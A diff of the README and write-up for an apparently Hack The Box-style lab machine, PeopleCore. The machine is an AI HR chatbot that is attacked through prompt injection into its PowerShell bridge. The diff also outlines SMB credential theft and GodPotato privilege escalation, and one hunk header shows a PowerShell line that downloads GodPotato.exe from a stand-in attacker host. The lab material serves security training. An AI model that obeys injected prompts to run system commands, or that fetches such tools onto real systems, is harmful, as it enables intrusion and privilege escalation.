@@ -1,6 +1,4 @@
-¡Te entiendo perfectamente, hermano! HTB es muy estricto con la calidad. Te voy a dar un **README.md profesional** y un **WriteUp técnico completo** que cumple con todos los estándares de HTB.
 
----
 
 ## 📄 README.md (para GitHub)
 
@@ -17,7 +15,9 @@
 
 ## 🏢 Description
 
-**Nexus Dynamics Corp** deployed **PeopleCore**, an AI-powered HR Assistant designed to help employees with vacation policies, payroll questions, and onboarding tasks. To "streamline HR workflows," the IT team integrated PowerShell automation into the chatbot, allowing it to execute system commands. This integration introduces a critical vulnerability that can be exploited to gain unauthorized access.
+**Nexus Dynamics Corp** deployed **PeopleCore**, an AI-powered HR Assistant designed to help employees with vacation policies, payroll questions, and onboarding tasks.
+To "streamline HR workflows," the IT team integrated PowerShell automation into the chatbot, allowing it to execute system commands. This integration introduces a
+critical vulnerability that can be exploited to gain unauthorized access.
 
 Can you exploit the AI assistant, bypass its restrictions, and compromise the system?
 
@@ -262,7 +262,9 @@ iwr -uri http://attacker/GodPotato.exe -outfile GodPotato.exe
 
 ## 🖥️ Machine Overview
 
-PeopleCore is a Windows Server 2022 machine running an AI-powered HR assistant. The application uses a vulnerable PowerShell bridge that allows command execution via prompt injection. Initial access is obtained through credentials found in an anonymous SMB share. Privilege escalation is achieved by exploiting the SeImpersonatePrivilege using GodPotato.
+PeopleCore is a Windows Server 2022 machine running an AI-powered HR assistant. The application uses a vulnerable PowerShell bridge that allows
+command execution via prompt injection. Initial access is obtained through credentials found in an anonymous SMB share. Privilege escalation is achieved by exploiting
+ the SeImpersonatePrivilege using GodPotato.
 
 ---
 
